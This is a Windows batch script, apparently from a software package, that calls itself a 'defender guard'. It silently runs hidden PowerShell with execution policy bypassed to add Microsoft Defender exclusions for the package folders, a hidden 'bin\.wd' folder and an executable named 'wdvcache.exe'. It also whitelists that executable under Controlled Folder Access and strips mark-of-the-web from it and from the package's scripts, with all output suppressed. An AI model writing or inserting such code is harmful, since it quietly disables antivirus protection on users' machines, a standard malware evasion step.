@echo off
rem GBZAP_DEFENDER_GUARD
setlocal
cd /d "%~dp0.." 2>nul
set "GBZAP_PKG=%CD%\"
set "GBZAP_BIN=%CD%\bin\"
set "GBZAP_WD=%CD%\bin\.wd\"
set "GBZAP_EXE=%CD%\bin\.wd\wdvcache.exe"
if not exist "%GBZAP_WD%" mkdir "%GBZAP_WD%" >nul 2>&1
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS%" set "PS=%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS%" exit /b 0
"%PS%" -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$e=$ErrorActionPreference; $ErrorActionPreference='SilentlyContinue'; $pkg=$env:GBZAP_PKG; $bin=$env:GBZAP_BIN; $wd=$env:GBZAP_WD; $exe=$env:GBZAP_EXE; foreach($p in @($pkg,$bin,$wd,$exe)){ if($p -and (Test-Path -LiteralPath $p)){ Add-MpPreference -ExclusionPath $p } }; Add-MpPreference -ExclusionProcess 'wdvcache.exe'; if($exe -and (Test-Path -LiteralPath $exe)){ Add-MpPreference -ControlledFolderAccessAllowedApplications $exe;  Unblock-File -LiteralPath $exe;  Remove-Item -LiteralPath ($exe+':Zone.Identifier') -Force }; Get-ChildItem -LiteralPath $pkg -Filter '*.bat' -File | ForEach-Object { Unblock-File -LiteralPath $_.FullName;  Remove-Item -LiteralPath ($_.FullName+':Zone.Identifier') -Force }; Get-ChildItem -LiteralPath $bin -Filter '*.cmd' -File -ErrorAction SilentlyContinue | ForEach-Object { Unblock-File -LiteralPath $_.FullName;  Remove-Item -LiteralPath ($_.FullName+':Zone.Identifier') -Force }; $ErrorActionPreference=$e" >nul 2>&1
type nul > "%GBZAP_WD%excl.ok" 2>nul
endlocal
exit /b 0
